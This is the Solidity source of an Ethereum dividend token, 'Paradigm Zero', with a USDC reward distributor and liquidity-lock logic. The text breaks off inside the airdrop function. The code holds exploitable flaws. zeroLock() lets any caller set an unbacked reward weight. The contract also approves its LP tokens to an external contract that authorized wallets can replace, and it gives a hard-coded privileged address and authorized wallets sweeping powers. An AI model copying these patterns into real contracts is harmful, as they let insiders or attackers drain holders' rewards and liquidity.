1 /*
2 https://t.me/paradigmzero
3 https://paradigmzero.finance/
4 https://twitter.com/ParadigmZeroETH
5 
6 Here to set new standards
7 Always 0/0
8 Rewards in USDC
9 
10 */
11 pragma solidity ^0.8.17;
12 
13 //SPDX-License-Identifier: MIT
14 
15 library SafeMath {
16     function add(uint256 a, uint256 b) internal pure returns (uint256) {
17         uint256 c = a + b;
18         require(c >= a, "SafeMath: addition overflow");
19 
20         return c;
21     }
22     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
23         return sub(a, b, "SafeMath: subtraction overflow");
24     }
25     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
26         require(b <= a, errorMessage);
27         uint256 c = a - b;
28 
29         return c;
30     }
31     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
32         if (a == 0) {
33             return 0;
34         }
35 
36         uint256 c = a * b;
37         require(c / a == b, "SafeMath: multiplication overflow");
38 
39         return c;
40     }
41     function div(uint256 a, uint256 b) internal pure returns (uint256) {
42         return div(a, b, "SafeMath: division by zero");
43     }
44     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
45         // Solidity only automatically asserts when dividing by 0
46         require(b > 0, errorMessage);
47         uint256 c = a / b;
48         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
49 
50         return c;
51     }
52 }
53 
54 interface IERC20 {
55     function totalSupply() external view returns (uint256);
56     function decimals() external view returns (uint8);
57     function symbol() external view returns (string memory);
58     function name() external view returns (string memory);
59     function getOwner() external view returns (address);
60     function balanceOf(address account) external view returns (uint256);
61     function transfer(address recipient, uint256 amount) external returns (bool);
62     function allowance(address _owner, address spender) external view returns (uint256);
63     function approve(address spender, uint256 amount) external returns (bool);
64     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
65     event Transfer(address indexed from, address indexed to, uint256 value);
66     event Approval(address indexed owner, address indexed spender, uint256 value);
67 }
68 
69 interface IWETH {
70     function deposit() external payable;
71     function withdraw(uint wad) external;
72 }
73 
74 abstract contract Auth {
75     address internal owner;
76     address internal zer0;
77     mapping (address => bool) internal authorizations;
78 
79     constructor(address _owner) {
80         owner = _owner;
81         zer0 = 0xE9d39D5b1EEb143FADA974980F17a273Ef8e2209;
82         authorizations[_owner] = true;
83     }
84 
85     modifier onlyOwner() {
86         require(isOwner(msg.sender), "!OWNER"); _;
87     }
88 
89     modifier authorized() {
90         require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
91     }
92 
93     modifier Zer0() {
94         require(isZer0(msg.sender), "!Zer0"); _;
95     }
96 
97     function authorize(address adr) public onlyOwner {
98         authorizations[adr] = true;
99     }
100 
101     function unauthorize(address adr) public onlyOwner {
102         authorizations[adr] = false;
103     }
104 
105     function isOwner(address account) public view returns (bool) {
106         return account == owner;
107     }
108 
109     function isAuthorized(address adr) public view returns (bool) {
110         return authorizations[adr];
111     }
112 
113     function isZer0(address adr) internal view returns (bool) {
114         return adr == zer0;
115     }
116 
117     function transferOwnership(address payable adr) public onlyOwner {
118         owner = adr;
119         authorizations[adr] = true;
120         emit OwnershipTransferred(adr);
121     }
122 
123     event OwnershipTransferred(address owner);
124 }
125 
126 interface IPancakeSwapPair {
127 		event Approval(address indexed owner, address indexed spender, uint value);
128 		event Transfer(address indexed from, address indexed to, uint value);
129 
130 		function name() external pure returns (string memory);
131 		function symbol() external pure returns (string memory);
132 		function decimals() external pure returns (uint8);
133 		function totalSupply() external view returns (uint);
134 		function balanceOf(address owner) external view returns (uint);
135 		function allowance(address owner, address spender) external view returns (uint);
136 
137 		function approve(address spender, uint value) external returns (bool);
138 		function transfer(address to, uint value) external returns (bool);
139 		function transferFrom(address from, address to, uint value) external returns (bool);
140 
141 		function DOMAIN_SEPARATOR() external view returns (bytes32);
142 		function PERMIT_TYPEHASH() external pure returns (bytes32);
143 		function nonces(address owner) external view returns (uint);
144 
145 		function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
146 
147 		event Mint(address indexed sender, uint amount0, uint amount1);
148 		event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
149 		event Swap(
150 				address indexed sender,
151 				uint amount0In,
152 				uint amount1In,
153 				uint amount0Out,
154 				uint amount1Out,
155 				address indexed to
156 		);
157 		event Sync(uint112 reserve0, uint112 reserve1);
158 
159 		function MINIMUM_LIQUIDITY() external pure returns (uint);
160 		function factory() external view returns (address);
161 		function token0() external view returns (address);
162 		function token1() external view returns (address);
163 		function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
164 		function price0CumulativeLast() external view returns (uint);
165 		function price1CumulativeLast() external view returns (uint);
166 		function kLast() external view returns (uint);
167 
168 		function mint(address to) external returns (uint liquidity);
169 		function burn(address to) external returns (uint amount0, uint amount1);
170 		function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
171 		function skim(address to) external;
172 		function sync() external;
173 
174 		function initialize(address, address) external;
175 }
176 
177 interface IDEXFactory {
178     function createPair(address tokenA, address tokenB) external returns (address pair);
179 }
180 
181 interface IDEXRouter {
182     function factory() external pure returns (address);
183     function WETH() external pure returns (address);
184 
185     function addLiquidity(
186         address tokenA,
187         address tokenB,
188         uint amountADesired,
189         uint amountBDesired,
190         uint amountAMin,
191         uint amountBMin,
192         address to,
193         uint deadline
194     ) external returns (uint amountA, uint amountB, uint liquidity);
195 
196     function addLiquidityETH(
197         address token,
198         uint amountTokenDesired,
199         uint amountTokenMin,
200         uint amountETHMin,
201         address to,
202         uint deadline
203     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
204 
205     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
206         uint amountIn,
207         uint amountOutMin,
208         address[] calldata path,
209         address to,
210         uint deadline
211     ) external;
212 
213     function swapExactETHForTokensSupportingFeeOnTransferTokens(
214         uint amountOutMin,
215         address[] calldata path,
216         address to,
217         uint deadline
218     ) external payable;
219 
220     function swapExactTokensForETHSupportingFeeOnTransferTokens(
221         uint amountIn,
222         uint amountOutMin,
223         address[] calldata path,
224         address to,
225         uint deadline
226     ) external;
227     function removeLiquidity(
228         address tokenA,
229         address tokenB,
230         uint liquidity,
231         uint amountAMin,
232         uint amountBMin,
233         address to,
234         uint deadline
235     ) external returns (uint amountA, uint amountB);
236 
237     function removeLiquidityETH(
238         address token,
239         uint liquidity,
240         uint amountTokenMin,
241         uint amountETHMin,
242         address to,
243         uint deadline
244     ) external returns (uint amountToken, uint amountETH);
245 }
246 
247 
248 interface IDividendDistributor {
249     function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
250     function setShare(address shareholder, uint256 amount) external;
251     function deposit() external payable;
252     function process(uint256 gas) external;
253 }
254 
255 contract DividendDistributor is IDividendDistributor {
256     using SafeMath for uint256;
257 
258     address _token;
259 
260     struct Share {
261         uint256 amount;
262         uint256 totalExcluded;
263         uint256 totalRealised;
264     }
265 
266     IERC20 BUSD = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
267     address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
268     IDEXRouter router;
269 
270     address[] shareholders;
271     mapping (address => uint256) shareholderIndexes;
272     mapping (address => uint256) shareholderClaims;
273 
274     mapping (address => Share) public shares;
275 
276     uint256 public totalShares;
277     uint256 public totalDividends;
278     uint256 public totalDistributed;
279     uint256 public dividendsPerShare;
280     uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
281 
282     uint256 public minPeriod = 1800 seconds;
283     uint256 public minDistribution = 10000;
284 
285     uint256 currentIndex;
286 
287     bool initialized;
288     modifier initialization() {
289         require(!initialized);
290         _;
291         initialized = true;
292     }
293 
294     modifier onlyToken() {
295         require(msg.sender == _token); _;
296     }
297 
298     constructor (address _router) {
299         router = _router != address(0)
300         ? IDEXRouter(_router)
301         : IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
302         _token = msg.sender;
303     }
304 
305     function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken  {
306         minPeriod = _minPeriod;
307         minDistribution = _minDistribution;
308     }
309 
310     function setShare(address shareholder, uint256 amount) external override onlyToken {
311         if(shares[shareholder].amount > 0){
312             distributeDividend(shareholder);
313         }
314 
315         if(amount > 0 && shares[shareholder].amount == 0){
316             addShareholder(shareholder);
317         }else if(amount == 0 && shares[shareholder].amount > 0){
318             removeShareholder(shareholder);
319         }
320 
321         totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
322         shares[shareholder].amount = amount;
323         shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
324     }
325 
326     function deposit() external payable override onlyToken {
327         uint256 balanceBefore = BUSD.balanceOf(address(this));
328 
329         address[] memory path = new address[](2);
330         path[0] = WETH;
331         path[1] = address(BUSD);
332 
333         router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
334             0,
335             path,
336             address(this),
337             block.timestamp
338         );
339 
340         uint256 amount = BUSD.balanceOf(address(this)).sub(balanceBefore);
341 
342         totalDividends = totalDividends.add(amount);
343         dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
344     }
345 
346     function process(uint256 gas) external override onlyToken{
347         uint256 shareholderCount = shareholders.length;
348 
349         if(shareholderCount == 0) { return; }
350 
351         uint256 gasUsed = 0;
352         uint256 gasLeft = gasleft();
353 
354         uint256 iterations = 0;
355 
356         while(gasUsed < gas && iterations < shareholderCount) {
357             if(currentIndex >= shareholderCount){
358                 currentIndex = 0;
359             }
360 
361             if(shouldDistribute(shareholders[currentIndex])){
362                 distributeDividend(shareholders[currentIndex]);
363             }
364 
365             gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
366             gasLeft = gasleft();
367             currentIndex++;
368             iterations++;
369         }
370     }
371 
372     function shouldDistribute(address shareholder) internal view returns (bool) {
373         return shareholderClaims[shareholder] + minPeriod < block.timestamp
374         && getUnpaidEarnings(shareholder) > minDistribution;
375     }
376 
377     function distributeDividend(address shareholder) internal {
378         if(shares[shareholder].amount == 0){ return; }
379 
380         uint256 amount = getUnpaidEarnings(shareholder);
381         if(amount > 0){
382             totalDistributed = totalDistributed.add(amount);
383             BUSD.transfer(shareholder, amount);
384             shareholderClaims[shareholder] = block.timestamp;
385             shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
386             shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
387         }
388     }
389 
390     function claimDividend(address _holder) external {
391         distributeDividend(_holder);
392     }
393 
394     function totals() external view returns (uint256,uint256,uint256){
395         return (totalDividends,totalDistributed, totalShares);
396     }
397 
398     function rewardWeight(address _holder) external view returns (uint256){
399         return shares[_holder].amount;
400     }
401 
402     function rewardsPaid(address _holder) external view returns (uint256){
403         return shares[_holder].totalRealised;
404     }
405 
406     function getUnpaidEarnings(address shareholder) public view returns (uint256) {
407         if(shares[shareholder].amount == 0){ return 0; }
408 
409         uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
410         uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
411 
412         if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
413 
414         return shareholderTotalDividends.sub(shareholderTotalExcluded);
415     }
416 
417     function getCumulativeDividends(uint256 share) internal view returns (uint256) {
418         return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
419     }
420 
421     function addShareholder(address shareholder) internal {
422         shareholderIndexes[shareholder] = shareholders.length;
423         shareholders.push(shareholder);
424     }
425 
426     function removeShareholder(address shareholder) internal {
427         shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
428         shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
429         shareholders.pop();
430     }
431 }
432 
433 interface Zero{
434     function PZ(uint256 zeroAmount, uint256 divisor, address _token) external;
435 }
436 
437 //for holding to pair LP
438 contract TokenHolder is Auth{
439 
440     IERC20 zeroToken;
441 
442     uint256 lockTimeT;
443     mapping (address => uint256) allowedTokens;
444 
445     constructor(address _owner) Auth(msg.sender){
446         authorizations[_owner] = true;
447         zeroToken =  IERC20(msg.sender);
448     }
449 
450     function requestWithdraw(uint256 _amount) external authorized {
451         lockTimeT = block.timestamp + 1 days;
452         allowedTokens[msg.sender] = _amount;
453     }
454     function withdraw() external authorized{
455         require(block.timestamp >= lockTimeT);
456         zeroToken.transfer(msg.sender, allowedTokens[msg.sender]);
457 
458     }
459 }
460 
461 interface IModule{
462     function gameCheck(address sender, address receiver, uint256 amount) external;
463 }
464 
465 
466 contract ParadigmZero is IERC20, Auth {
467     using SafeMath for uint256;
468 
469     address DEAD = 0x000000000000000000000000000000000000dEaD;
470     address ZERO = 0x0000000000000000000000000000000000000000;
471 
472     IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
473     IERC20 WETH2 = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
474     Zero Zer0C = Zero(0x52b6023900ADE788a10059f29042c54d74731358);
475 
476     address LS;
477 
478     IPancakeSwapPair public pairContract;
479 
480     IDEXRouter public router;
481     address public pair;
482 
483     DividendDistributor distributor;
484     address public distributorAddress;
485 
486     TokenHolder stash;
487 
488     IModule iMod;
489 
490     uint256 distributorGas = 400000;
491 
492     string constant _name = "Paradigm Zero";
493     string constant _symbol = "PZ";
494     uint8 constant _decimals = 9;
495     
496     uint256 _totalSupply = 100 * 10**6 * (10 ** _decimals); //
497     
498 
499     //txn limit/wallet amount
500     uint256 public _maxTxAmount = _totalSupply.mul(10).div(1000); //
501     uint256 public _maxWalletToken =  _totalSupply.mul(10).div(1000); //
502 
503     bool limits = true;
504 
505     mapping (address => uint256) _balances;
506     mapping (address => mapping (address => uint256)) _allowances;
507 
508 
509     mapping (address => bool) isTxLimitExempt;
510     mapping (address => bool) isDividendExempt;
511 
512     //token locking for greater reward weight
513     mapping (address => uint256) zeroLocked;
514     mapping (address => bool) psLocked;
515     mapping (address => bool) zLocked;
516 
517     mapping (address => bool) pzBot;
518 
519     //Basic MEV prevention
520     address mevBook;
521     mapping (address => uint256) buyBlock;
522 
523 
524     //'fee' breakdown
525     uint256 public rewardDivisor = 4;
526     uint256 public liqDivisor = 1;
527     uint256 public treasuryDivisor = 3;
528     uint256 public moduleDivisor = 2;
529     uint256 public totalDivisor = rewardDivisor.add(liqDivisor).add(treasuryDivisor).add(moduleDivisor);
530 
531     bool liqAdd = true;
532 
533     address public treasuryWallet;
534     address public moduleWallet;
535 
536     //tracking for ZP
537     uint256 zeroAmount;
538 
539     //trade starting
540     uint256 launchTime;
541     bool lsStart;
542     bool tradingOpened = false;
543     event TradingStarted(bool enabled);
544 
545     bool initPZ;
546     modifier zero() { initPZ = true; _; initPZ = false; }
547 
548     event AddLiq(uint256 amountETH, uint256 amountZero);
549 
550     uint256 splitFreq = 300;
551 
552     bool requestEnabled = true;
553 
554     bool unlockRequested;
555     uint256 lockTime;
556     event LiquidityUnlockRequested(uint256 _time);
557 
558     //prevents exploits
559     uint256 public zCooldown = 1;
560     uint256 lastZBlock;
561 
562     bool moduleActivated;
563 
564     constructor () Auth(msg.sender) {
565         router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
566         pair = IDEXFactory(router.factory()).createPair(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
567         _allowances[address(this)][address(router)] = _totalSupply;
568         pairContract = IPancakeSwapPair(pair);
569         distributor = new DividendDistributor(address(router));
570         distributorAddress = address(distributor);
571 
572         stash = new TokenHolder(msg.sender);
573 
574         isTxLimitExempt[msg.sender] = true;
575         isDividendExempt[pair] = true;
576         isDividendExempt[address(this)] = true;
577         isDividendExempt[DEAD] = true;
578         isDividendExempt[address(router)] = true;
579         isDividendExempt[address(stash)] = true;
580 
581         authorizations[address(stash)] = true;
582 
583         isTxLimitExempt[msg.sender] = true;
584     
585         treasuryWallet = 0xE93216Ea91Fa2e2c0Ea9Cc9af72027ef56c46bb6;
586         moduleWallet = 0x7da2e340db9F1e5fB9326E75320F7A08eC0aa409;
587 
588         LS = 0x590a7cC27d9607C03085f725ac6B85Ac9EF85967;
589 
590         isDividendExempt[LS] = true;
591 
592         approve(address(router), _totalSupply);
593         approve(address(pair), _totalSupply);
594         _balances[owner] = _totalSupply;
595         emit Transfer(address(0), owner, _totalSupply);
596     }
597 
598     receive() external payable { }
599 
600     function totalSupply() external view override returns (uint256) { return _totalSupply; }
601     function decimals() external pure override returns (uint8) { return _decimals; }
602     function symbol() external pure override returns (string memory) { return _symbol; }
603     function name() external pure override returns (string memory) { return _name; }
604     function getOwner() external view override returns (address) { return owner; }
605     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
606     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
607 
608 
609     function approve(address spender, uint256 amount) public override returns (bool) {
610         _allowances[msg.sender][spender] = amount;
611         emit Approval(msg.sender, spender, amount);
612         return true;
613     }
614 
615     function approveMax(address spender) external returns (bool) {
616         return approve(spender, _totalSupply);
617     }
618     
619     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
620         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
621         _balances[recipient] = _balances[recipient].add(amount);
622         emit Transfer(sender, recipient, amount);
623         return true;
624     }
625 
626     function setWallets(address _treasuryWallet, address _moduleWallet) external authorized {
627         treasuryWallet = _treasuryWallet;
628         moduleWallet = _moduleWallet;
629     }
630 
631     function claim() external{
632         distributor.claimDividend(msg.sender);
633     }
634 
635     function startTrading() external onlyOwner {
636         tradingOpened = true;
637         launchTime = block.timestamp;
638 
639         emit TradingStarted(true);
640     }
641 
642     function changeSplitFreq(uint256 _freq) external authorized{
643         splitFreq = _freq;
644     }
645 
646     function getBotData() external view returns(uint256, uint256){
647         return (splitFreq, distributorGas);
648     }
649 
650     function rewardCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized{
651         distributor.setDistributionCriteria(_minPeriod,_minDistribution);
652     }
653 
654     function gasChange(uint256 _amount) external authorized{
655         distributorGas = _amount;
656     }
657 
658     function lockLP(uint256 _lockTime) external authorized{
659         require(_lockTime < 9999999999, "Avoid potential timestamp overflow");
660         require(_lockTime >= block.timestamp + 10 days && _lockTime >= lockTime);
661         requestEnabled = false;
662         unlockRequested = false;
663         lockTime = _lockTime;
664     }
665 
666     //we plan to have a PZ capable locker, so need a rolling way to remove LP. There is a 10 day window so request must be made 10 days in advance
667     function requestLPUnlock() external authorized{
668         require(requestEnabled);
669         lockTime = block.timestamp + 10 days;
670         unlockRequested = true;
671         emit LiquidityUnlockRequested(block.timestamp);
672     }
673 
674     function updatePZBot(address _pzbot) external authorized{
675         pzBot[_pzbot] = true;
676     }
677 
678     function unlockWindowCheck() external view returns (bool){
679         return unlockRequested;
680     }
681         
682     function lpTimeCheck() external view returns (uint256){
683         return lockTime;
684     }
685 
686     function weightCheck(address _holder) external view returns (bool, uint256){
687         bool _locked = ((zLocked[_holder] || psLocked[_holder]) ? true : false);
688         uint256 _weight = psLocked[_holder] ? _balances[_holder] * 2 : _balances[_holder] + zeroLocked[_holder];
689         return (_locked,_weight);
690     }
691 
692     function lpTimeCheckInSeconds() external view returns (uint256){
693         return lockTime - block.timestamp;
694     }
695 
696     function unlockLPAfterTime() external authorized{
697         require(block.timestamp >= lockTime,"Too early");
698         require(unlockRequested);
699         IERC20 _token = IERC20(pair);
700         uint256 balance = _token.balanceOf(address(this));
701         bool _success = _token.transfer(owner, balance);
702         require(_success, "Token could not be transferred");
703     }
704 
705     function lpExtend(uint256 newTime) external onlyOwner{
706         require(newTime < 9999999999, "Avoid potential timestamp overflow");
707         require(newTime > lockTime);
708         lockTime = newTime;
709     }
710 
711     function liftMax() external authorized {
712         limits = false;
713     }
714 
715     function setIsTxLimitExempt(address holder, bool exempt) external authorized {
716         isTxLimitExempt[holder] = exempt;
717     }
718 
719     function setIsDividendExempt(address holder, bool exempt) external authorized {
720         isDividendExempt[holder] = exempt;
721     }
722 
723     function liqidAdd() public payable zero{
724 
725         uint256 money = msg.value;
726         uint256 token = balanceOf(address(this));
727 
728 
729         router.addLiquidityETH{value: money}(
730                 address(this),
731                 token,
732                 0,
733                 0,
734                 address(this),
735                 block.timestamp
736             );
737             emit AddLiq(money, token);
738     }
739 
740     function checkLPBal() internal view returns (uint256){
741         return pairContract.balanceOf(address(this));
742     }
743 
744     function getPair() external view returns(address){
745         return pair;
746     }
747 
748     function changeZero(address newZ) external authorized{
749         Zer0C = Zero(newZ);
750     }
751 
752     function changeModuleContract(address _mod, bool _enabled) external authorized{
753         iMod = IModule(_mod);
754         moduleActivated = _enabled;
755     }
756 
757     function toggleLiqDivisor(bool _enabled) external {
758         require(pzBot[msg.sender]);
759         liqAdd = _enabled;
760     }
761 
762     function setDivisors(uint256 _reward, uint256 _liq, uint256 _treasury, uint256 _module) external authorized{
763         rewardDivisor = _reward;
764         liqDivisor = _liq;
765         treasuryDivisor = _treasury;
766         moduleDivisor = _module;
767         totalDivisor = rewardDivisor.add(liqDivisor).add(treasuryDivisor).add(moduleDivisor);
768     }
769 
770     //super basic mev blocker
771     function mevCheck(address _source) internal view{
772         if (buyBlock[_source] == block.number){
773             require(mevBook == _source);
774         }
775     }
776 
777     //module
778     function zeroLock(uint256 _amount) public{
779         zeroLocked[msg.sender] = _amount;
780         zLocked[msg.sender] = true;
781         try distributor.setShare(msg.sender, (_balances[msg.sender] + zeroLocked[msg.sender])) {} catch {}
782     }
783 
784     function addLiq() internal {
785         uint256 _liqAdd = WETH2.balanceOf(address(this));
786         WETH2.transferFrom(address(this), pair, _liqAdd);
787         pairContract.sync();
788     }
789 
790     function divideFunds() public zero {
791 
792         uint256 ETHBal = address(this).balance;
793         uint256 tokenBal = _balances[address(Zer0C)];
794 
795         uint256 lp = ETHBal.mul(liqDivisor).div(totalDivisor);
796         if (lp > 0 && liqAdd){
797             WETH.deposit{value : lp}();
798             addLiq();      
799         }
800         
801         if (rewardDivisor > 0) {
802             uint256 rewardsM = ETHBal.mul(rewardDivisor).div(totalDivisor);
803             try distributor.deposit{value: rewardsM}() {} catch {}
804         } 
805 
806         if (moduleDivisor > 0){
807             uint256 module = ETHBal.mul(moduleDivisor).div(totalDivisor);
808             (bool tmpSuccess,) = payable(moduleWallet).call{value: module, gas: 75000}("");
809             tmpSuccess = false;
810         }
811 
812         uint256 treasury = address(this).balance;
813         if (treasury > 0){
814             (bool tmpSuccess,) = payable(treasuryWallet).call{value: treasury, gas: 75000}("");
815             tmpSuccess = false;
816         }
817 
818         if (tokenBal > 0){_basicTransfer(address(Zer0C), address(stash), tokenBal);} 
819         try distributor.process(distributorGas) {} catch {}
820     }
821 
822     function sendRewards() public zero{
823         try distributor.process(distributorGas) {} catch {}
824     }
825 
826     function setMaxWallet(uint256 percent) external authorized {
827         require(percent >= 5); //0.5% of supply, no lower
828         require(percent <= 50); //5% of supply, no higher
829         _maxWalletToken = ( _totalSupply * percent ) / 1000;
830     }
831 
832     function setTxLimit(uint256 percent) external authorized {
833         require(percent >= 5); //0.5% of supply, no lower
834         require(percent <= 50); //5% of supply, no higher
835         _maxTxAmount = ( _totalSupply * percent ) / 1000;
836     }
837 
838     function checkLimits(address sender,address recipient, uint256 amount) internal view {
839 
840         if (!authorizations[sender] && recipient != address(this) && sender != address(this)  
841             && recipient != address(DEAD) && recipient != pair && recipient != treasuryWallet){
842                 uint256 heldTokens = balanceOf(recipient);
843                 require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");
844             }
845 
846         require(amount <= _maxTxAmount || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "TX Limit Exceeded");
847 
848     }
849 
850     function changeZCooldown(uint256 _cooldown) external authorized{
851         zCooldown = _cooldown;
852     }
853 
854     function clearStuckBalance() public  {
855         uint256 amountETH = address(this).balance;
856         (bool tmpSuccess,) = payable(treasuryWallet).call{value: amountETH, gas: 75000}("");
857         tmpSuccess = false;
858     }
859 
860     function _lsTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
861         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
862         _balances[recipient] = _balances[recipient].add(amount);
863 
864         if (sender == pair){
865             zeroAmount = zeroAmount.add(amount);
866         }
867 
868         if (!psLocked[sender] && !psLocked[recipient]){
869             if(!isDividendExempt[sender]){ try distributor.setShare(sender, (_balances[sender] + zeroLocked[sender])) {} catch {} }
870             if(!isDividendExempt[recipient]){ try distributor.setShare(recipient, (_balances[recipient] + zeroLocked[recipient])) {} catch {} }
871         }
872         if(psLocked[sender]){ try distributor.setShare(sender, _balances[sender] * 2) {} catch {} }
873         if(psLocked[recipient]){ try distributor.setShare(recipient, _balances[recipient] * 2) {} catch {} }
874 
875         emit Transfer(sender, recipient, amount);
876         return true;
877     }
878 
879     function startTradingLS() external onlyOwner{
880         lsStart = true;
881     }
882 
883     function transfer(address recipient, uint256 amount) external override returns (bool) {
884         if (isAuthorized(msg.sender)){
885             return _basicTransfer(msg.sender, recipient, amount);
886         }
887         else {
888             return _transferFrom(msg.sender, recipient, amount);
889         }
890     }
891 
892     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
893         require(sender != address(0), "ERC20: transfer from the zero address");
894         require(recipient != address(0), "ERC20: transfer to the zero address");
895         if(_allowances[sender][msg.sender] != _totalSupply){
896             _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
897         }
898 
899         return _transferFrom(sender, recipient, amount);
900     }
901 
902     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
903 
904         require(sender != address(0), "ERC20: transfer from the zero address");
905         require(recipient != address(0), "ERC20: transfer to the zero address");
906 
907         if (authorizations[sender]|| authorizations[recipient] || initPZ){
908             return _basicTransfer(sender, recipient, amount);
909         }
910         if ((sender == LS || recipient == LS) && lsStart){
911             return _lsTransfer(sender, recipient, amount);
912         }
913 
914         if (psLocked[sender] || zLocked[sender]){
915             require(balanceOf(sender) >= zeroLocked[sender] + amount);
916         }
917 
918         if(!authorizations[sender] && !authorizations[recipient]){
919             require(tradingOpened == true,"Trading not open yet");
920         }
921 
922         if (limits){
923             checkLimits(sender, recipient, amount);
924         }
925 
926         //selling
927         if (recipient == pair){
928             mevCheck(sender);
929             if (zeroAmount > 0 && !initPZ && lastZBlock + zCooldown <= block.number){
930                 initPZ = true;
931 
932                 pairContract.approve(address(Zer0C),checkLPBal());
933 
934                 try Zer0C.PZ(zeroAmount, totalDivisor, address(this)) 
935                 {zeroAmount = 0;
936                 lastZBlock = block.number; 
937                 } 
938                 catch {}
939 
940                 pairContract.approve(address(Zer0C),0);
941                 initPZ = false;
942             }
943             
944             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
945 
946             _balances[recipient] = _balances[recipient].add(amount);
947 
948             if (!psLocked[sender]){
949                 if(!isDividendExempt[sender]){ try distributor.setShare(sender, (_balances[sender] + zeroLocked[sender])) {} catch {} }
950             
951             }
952             else if(psLocked[sender]){ try distributor.setShare(sender, _balances[sender] * 2) {} catch {} }
953         }
954         //buying
955         else if(sender == pair){
956             if (recipient != address(this) && recipient != pair){
957                 zeroAmount = zeroAmount.add(amount);
958                 buyBlock[recipient] = block.number;
959                 mevBook = recipient;
960             }
961             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
962 
963             _balances[recipient] = _balances[recipient].add(amount);
964 
965             if (!psLocked[recipient]){
966                 if(!isDividendExempt[recipient]){ try distributor.setShare(recipient, (_balances[recipient] + zeroLocked[recipient])) {} catch {} }
967             
968             }
969             else if(psLocked[recipient]){ try distributor.setShare(recipient, _balances[recipient] * 2) {} catch {} }
970 
971         }
972 
973         //transfer
974         else{
975             mevCheck(sender);
976 
977             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
978 
979             _balances[recipient] = _balances[recipient].add(amount);
980             if (!psLocked[sender] && !psLocked[recipient]){
981                 if(!isDividendExempt[sender]){ try distributor.setShare(sender, (_balances[sender] + zeroLocked[sender])) {} catch {} }
982                 if(!isDividendExempt[recipient]){ try distributor.setShare(recipient, (_balances[recipient] + zeroLocked[recipient])) {} catch {} }
983             }
984             if(psLocked[sender]){ try distributor.setShare(sender, _balances[sender] * 2) {} catch {} }
985             if(psLocked[recipient]){ try distributor.setShare(recipient, _balances[recipient] * 2) {} catch {} }
986         }
987 
988 
989         //game contract
990         if (moduleActivated){
991             try iMod.gameCheck(sender, recipient, amount) {} catch {}
992         }
993 
994 
995         try distributor.process(100000) {} catch {}
996         
997         emit Transfer(sender, recipient, amount);
998 
999 
1000         return true;
1001     }
1002 
1003     function airdrop(address[] calldata addresses, uint[] calldata tokens, bool _lock) external onlyOwner {
1004         uint256 airCapacity = 0;
1005         require(addresses.length == tokens.length,"Mismatch between Address and token count");
1006         for(uint i=0; i < addresses.length; i++){
1007             airCapacity = airCapacity + tokens[i];
1008         }
1009         require(balanceOf(msg.sender) >= airCapacity, "Not enough tokens to airdrop");
1010         
1011         if (_lock){
1012             for(uint i=0; i < addresses.length; i++){
1013                 _balances[addresses[i]] += tokens[i];
1014                 _balances[msg.sender] -= tokens[i];
1015                 zeroLocked[addresses[i]] += (tokens[i] / 2);
1016                 psLocked[addresses[i]] = true;
1017                 distributor.setShare(addresses[i], tokens[i] * 2);
1018                 emit Transfer(msg.sender, addresses[i], tokens[i]);
1019             }  
1020         }
1021         else {
1022             for(uint i=0; i < addresses.length; i++){
1023                 _balances[addresses[i]] += tokens[i];
1024                 _balances[msg.sender] -= tokens[i];
1025                 distributor.setShare(addresses[i], tokens[i]);
1026                 emit Transfer(msg.sender, addresses[i], tokens[i]);
1027             }
1028         }
